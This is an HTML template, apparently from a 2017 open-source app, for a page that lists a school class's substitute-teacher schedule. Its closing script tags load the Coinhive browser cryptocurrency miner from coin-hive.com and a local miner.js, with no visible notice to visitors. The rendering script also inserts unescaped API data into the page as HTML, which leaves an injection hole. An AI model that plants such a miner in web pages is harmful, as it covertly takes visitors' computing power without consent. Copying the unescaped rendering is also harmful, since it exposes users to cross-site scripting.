<!DOCTYPE html>
<html lang="de">

<head>
    <title>Substitutes</title>
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.100.2/css/materialize.min.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="manifest" href="/a/manifest.json">
    <meta name="charset" content="utf-8">
    <link rel="icon" href="/a/icons/drawable-xxhdpi/icon.png">
    <link rel="icon" sizes="512x512" href="/a/icons/hiresfavicon.png">
    <meta name="theme-color" content="#4db6ac">
    <link rel="stylesheet" href="/a/app.css">
</head>

<body>
<nav class="teal lighten-2"><a href="/" class="brand-logo center">Substitutes</a></nav>
<div class="container" id="app">
    <div class="card-panel grey lighten-3">
        <h4>Substitutes</h4>
        <p class="flow-text" id="title"></p>
        <table class="responsive-table">
            <thead>
            <th>Hour</th>
            <th>Teacher</th>
            <th>Subject</th>
            <th>Room</th>
            <th>Type</th>
            </thead>
            <tbody class="flow-text"></tbody>
        </table>
    </div>
</div>

<footer class="page-footer teal lighten-2">
    <div class="footer-copyright">
        <div class="container">
		&copy; 2017 Daniel Malik (<a href="https://fronbasal.de">@fronbasal</a>). This project is <a href="https://github.com/fronbasal/substitutes">open source!</a>.
        </div>
    </div>
</footer>

<script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.100.2/js/materialize.min.js"></script>
<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
<script src="/a/miner.js"></script>
<script>
    $(() => {
        $.getJSON("/api/c/{{ .class }}", data => {
            $.each(data.substitutes, (a, b) => {
                (b.type === "Cancelled") ? $("tbody").append(
                        "<tr class='teal-text text-lighten-2'><td>" +
                        b.hour + "</td><td>" + b.teacher +
                        "</td><td>" + b.subject + "</td><td>" + b.room + "</td><td>" + b.type.replace("Vertretung", "Substitute") +
                        "</td></tr>") : $("tbody").append(
                        "<tr><td>" + b.hour + "</td><td>" +
                        b.teacher +
                        "</td><td>" + b.subject + "</td><td>" + b.room + "</td><td>" + b.type.replace("Vertretung", "Substitute") +
                        "</td></tr>");
            });
            $("h4").html(data.meta.date.replace("Vertretungen", "Substitutes").split("/")[0]);
            $("#title").html(data.meta.class);
        }).catch(m => Materialize.toast(m.status + ": " + m.responseJSON.message));
    });
</script>
</body>

</html>
